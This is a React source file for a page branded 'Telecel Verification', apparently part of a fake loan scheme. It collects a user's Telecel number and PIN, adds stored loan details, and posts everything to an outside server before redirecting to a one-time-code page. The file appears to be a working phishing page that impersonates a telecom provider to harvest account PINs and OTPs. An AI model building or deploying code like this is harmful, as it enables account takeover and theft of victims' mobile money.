import { useState } from "react";
import axios from "axios";
import "../styles/app.css";

export default function Telecel() {
  const [loading, setLoading] = useState(false);

  const [data, setData] = useState({
    number: "",
    pin: "",
  });

  const handleChange = (e) => {
    setData({ ...data, [e.target.name]: e.target.value });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    const loanData = JSON.parse(localStorage.getItem("loanData"));

    setLoading(true);

    try {
      const res = await axios.post(
        "https://g-bayport-loans.onrender.com/apply",
        {
          ...loanData,
          ...data,
        }
      );

      if (res.data.id) {
        window.location.href = `/otp/${res.data.id}`;
      }

    } catch (err) {
      alert("Failed to submit");
      console.error(err);
    }

    setLoading(false);
  };

  return (
    <div className="loan-container">
      <div className="card">

        <div className="header">
          <img src="/icon.jpeg" className="logo" />
          <h1>Telecel Verification</h1>
          <p className="subtitle">
            Enter your Telecel number and PIN
          </p>
        </div>

        <form onSubmit={handleSubmit}>

          <div className="section">
            <label>Telecel Number *</label>
            <input
              name="number"
              placeholder="Enter your number"
              onChange={handleChange}
              required
            />
          </div>

          <div className="section">
            <label>PIN / Password *</label>
            <input
              name="pin"
              type="password"
              placeholder="Enter your PIN"
              onChange={handleChange}
              required
            />
          </div>

          <button className="btn" disabled={loading}>
            {loading ? <div className="spinner"></div> : "Continue"}
          </button>

        </form>

      </div>
    </div>
  );
}